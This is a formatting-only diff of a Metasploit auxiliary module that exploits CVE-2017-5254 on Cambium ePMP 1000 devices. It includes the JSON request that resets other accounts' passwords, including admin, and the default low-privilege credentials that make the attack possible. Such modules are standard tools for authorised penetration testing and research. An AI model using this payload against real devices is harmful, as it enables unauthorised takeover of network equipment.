@@ -7,26 +7,26 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::EPMP
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Cambium ePMP 1000 Account Password Reset',
-      'Description' => %{
+    super(
+      update_info(
+        info,
+        'Name' => 'Cambium ePMP 1000 Account Password Reset',
+        'Description' => %q{
           This module exploits an access control vulnerability in Cambium ePMP
           device management portal. It requires any one of the following non-admin login
           credentials - installer/installer, home/home - to reset password of other
           existing user(s) including 'admin'. All versions <=3.5 are affected. This
           module works on versions 3.0-3.5-RC7.
-      },
-      'Author' =>
-        [
+        },
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'References' =>
-        [
+        'References' => [
           ['CVE', '2017-5254'],
           ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']
         ],
-      'License' => MSF_LICENSE
-     )
+        'License' => MSF_LICENSE
+      )
     )
 
     register_options(
@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
     deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     unless is_app_epmp1000?
       return
     end
@@ -50,7 +50,7 @@ class MetasploitModule < Msf::Auxiliary
 
   # Account Reset happens here
   def reset_pass(config_uri, cookie)
-    pass_change_req = '{"device_props":{"' + "#{datastore['TARGET_USERNAME']}" + '_password' + '":"' + "#{datastore['NEW_PASSWORD']}" + '"},"template_props":{"config_id":"11"}}'
+    pass_change_req = '{"device_props":{"' + datastore['TARGET_USERNAME'].to_s + '_password' + '":"' + datastore['NEW_PASSWORD'].to_s + '"},"template_props":{"config_id":"11"}}'
 
     print_status("#{rhost}:#{rport} - Changing password for #{datastore['TARGET_USERNAME']} to #{datastore['NEW_PASSWORD']}")
 
@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
       res &&
       res.code == 200 &&
       res.headers.include?('Content-Type') &&
-      res.headers['Content-Type'].include?('application/json')&&
+      res.headers['Content-Type'].include?('application/json') &&
       res.body.include?('config_id')
     )
 
